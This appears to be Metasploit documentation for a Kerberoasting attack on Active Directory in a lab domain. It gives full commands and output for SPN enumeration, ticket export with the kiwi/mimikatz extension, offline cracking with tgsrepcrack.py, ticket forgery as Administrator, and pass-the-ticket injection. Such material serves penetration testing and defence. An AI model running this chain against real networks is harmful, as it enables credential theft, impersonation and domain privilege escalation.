
## Kerberoasting

Kerberoasting is a post-exploitation technique that tries to crack the password of a service acount withtin Active Directory. The attacker requests a ticket while pretending to be an account user with a service principal name (SPN), which contains an encrypted password. Once recieved, the attacker attemps to crack the password hash. 

If successful, the attacker possess user credentials that can be used to impersonate the account owner. Now the attacker appears to be an approved and legitimate user and has unrestricted access to any assets, systems or networks granted to the compromised account, boom roasted.

## Vulnerable Application

Any system leveraging kerberos as a means of authentication e.g. Active Directory, MSSQL

## Verification Steps

1. Start msfconsole
3. Obtain SPNs from your target 
	1. Do: `use auxiliary/gather/ldap_query`
	2. Do: `set action ENUM_USER_SPNS_KERBEROAST`
	3. Run the module and note the discovered SPNs
4.  Request Service Tickets using the kiwi extension
	1. Do: `load kiwi`
	2. Do: `kerberos_ticket_list`
5. Export service tickets using the kiwi extionsion
	1. Do: `kiwi_cmd kerberos::list /export`
6. Crack the encryped password in the service ticket using tgsrepcrack.py (more info on this python script below)
	1. Do:  `python3 tgsrepcrack.py passlist.txt 1-40a10000-Administrator@HTTP\~testService-EXAMPLE.COM.kirbi`
7. Rewrite the service tickets using kerberoast.py (more info on this python script below)
	1. Do:  `python3  kerberoast.py -p N0tpassword! -r 1-40a10000-Administrator@HTTP~testService-EXAMPLE.COM.kirbi -w Administrator.kirbi -u 500`
8. Finally inject the ticket back into RAM using meterpreter's kiwi extension
	1. `meterpreter > kiwi_cmd kerberos::ptt Administrator.kirbi`
	   

## Scenario

### SPN Discovery

First an SPN needs to be found. This can be done in a number of ways including using metasploit's very own ldap_query module :

```
msf6 > use auxiliary/gather/ldap_query
msf6 auxiliary(gather/ldap_query) > set RHOSTS 172.16.199.235
RHOSTS => 172.16.199.235
msf6 auxiliary(gather/ldap_query) > set BIND_DN DARWIN_CLAY
BIND_DN => DARWIN_CLAY
msf6 auxiliary(gather/ldap_query) > set BIND_PW N0tpassword!
BIND_PW => N0tpassword!
msf6 auxiliary(gather/ldap_query) > set action ENUM_USER_SPNS_KERBEROAST
action => ENUM_USER_SPNS_KERBEROAST
msf6 auxiliary(gather/ldap_query) > run
[*] Running module against 172.16.199.235

[+] Successfully bound to the LDAP server!
[*] Discovering base DN automatically
[*] 172.16.199.235:389 Getting root DSE
dn:
namingcontexts: DC=example,DC=com
namingcontexts: CN=Configuration,DC=example,DC=com
namingcontexts: CN=Schema,CN=Configuration,DC=example,DC=com

...

======================================================================

 Name                  Attributes
 ----                  ----------
 cn                    BERYL_SAVAGE
 samaccountname        BERYL_SAVAGE
 serviceprincipalname  CIFS/OGCWLPT1000000

CN=CAITLIN_CAMPBELL OU=Devices OU=FIN OU=Tier 1 DC=example DC=com
=================================================================

 Name                  Attributes
 ----                  ----------
 cn                    CAITLIN_CAMPBELL
 samaccountname        CAITLIN_CAMPBELL
 serviceprincipalname  ftp/BDEWSECS1000000

CN=NETTIE_BURNS OU=ITS OU=Stage DC=example DC=com
=================================================

 Name                  Attributes
 ----                  ----------
 cn                    ALBERTO_OLSEN
 samaccountname        ALBERTO_OLSEN
 serviceprincipalname  https/TSTWWKS1000002

CN=LESSIE_PHILLIPS OU=Test OU=GOO OU=Stage DC=example DC=com
============================================================

```

Great, we now have a couple SPNs to move forward with.

### Request Service Tickets 

We can request a Service Ticket using the kiwi extension in metasploit and one of the SPNs found above:
```
meterpreter > load kiwi
Loading extension kiwi...

  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
meterpreter > kiwi_cmd kerberos::ask /target:https/TSTWLPT1000000
Asking for: https/TSTWLPT1000000
   * Ticket Encryption Type & kvno not representative at screen

	   Start/End/MaxRenew: 12/16/2022 4:58:34 PM ; 12/17/2022 1:35:41 AM ; 12/23/2022 3:35:41 PM
	   Service Name (02) : https ; TSTWLPT1000000 ; @ EXAMPLE.COM
	   Target Name  (02) : https ; TSTWLPT1000000 ; @ EXAMPLE.COM
	   Client Name  (01) : Administrator ; @ EXAMPLE.COM
	   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
	   Session Key       : 0x00000017 - rc4_hmac_nt
	     07137dd7d5b801ef8b05c73380b18701
	   Ticket            : 0x00000017 - rc4_hmac_nt       ; kvno = 0	[...]

```

Tickets in the current session can be viewed like so: 
```

meterpreter > kerberos_ticket_list
[+] Kerberos tickets found in the current session.
[00000000] - 0x00000012 - aes256_hmac
   Start/End/MaxRenew: 12/16/2022 3:35:41 PM ; 12/17/2022 1:35:41 AM ; 12/23/2022 3:35:41 PM
   Server Name       : krbtgt/EXAMPLE.COM @ EXAMPLE.COM
   Client Name       : Administrator @ EXAMPLE.COM
   Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;

[00000001] - 0x00000017 - rc4_hmac_nt
   Start/End/MaxRenew: 12/16/2022 4:58:34 PM ; 12/17/2022 1:35:41 AM ; 12/23/2022 3:35:41 PM
   Server Name       : https/TSTWLPT1000000 @ EXAMPLE.COM
   Client Name       : Administrator @ EXAMPLE.COM
   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
```


### Export Service Tickets
```
meterpreter > kiwi_cmd kerberos::list /export

[00000001] - 0x00000017 - rc4_hmac_nt
   Start/End/MaxRenew: 12/16/2022 4:58:34 PM ; 12/17/2022 1:35:41 AM ; 12/23/2022 3:35:41 PM
   Server Name       : https/TSTWLPT1000000 @ EXAMPLE.COM
   Client Name       : Administrator @ EXAMPLE.COM
   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
====================
Base64 of file : 1-40a10000-Administrator@https~TSTWLPT1000000-EXAMPLE.COM.kirbi
====================
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
MDAwMA==
====================

   * Saved to file     : 1-40a10000-Administrator@https~TSTWLPT1000000-EXAMPLE.COM.kirbi
```


### Crack Service Tickets 

To crack the service ticket a number of tools can be used. In this example we'll use a python script **tgsrepcrack** is part of [Tim Medin](https://twitter.com/TimMedin) [Kerberoast](https://github.com/nidem/kerberoast) toolkit

```
➜  kerberoast git:(master) ✗ python3 tgsrepcrack.py passlist.txt 1-40a10000-Administrator@HTTP\~testService-EXAMPLE.COM.kirbi
Cracking 1 tickets...
found password for ticket 0: N0tpassword!  File: 1-40a10000-Administrator@HTTP~testService-EXAMPLE.COM.kirbi
Successfully cracked all tickets
```

### Rewrite Service Tickets & RAM Injection

Kerberos tickets are signed with the NTLM hash of the password. If the ticket hash has been cracked then it is possible to  rewrite the ticket with [Kerberoast](https://github.com/nidem/kerberoast) python script. This tactic will allow to impersonate any domain user or a fake account when the service is going to be accessed. Additionally privilege escalation is also possible as the user can be added into an elevated group such as Domain Admins.

```
➜  kerberoast git:(master) ✗ python3  kerberoast.py -p N0tpassword! -r 1-40a10000-Administrator@HTTP~testService-EXAMPLE.COM.kirbi -w Administrator.kirbi -u 500
```


The new ticket can be injected back into the memory with the following Mimikatz command in order to perform authentication with the targeted service via Kerberos protocol.

```
meterpreter > kiwi_cmd kerberos::ptt Administrator.kirbi
```





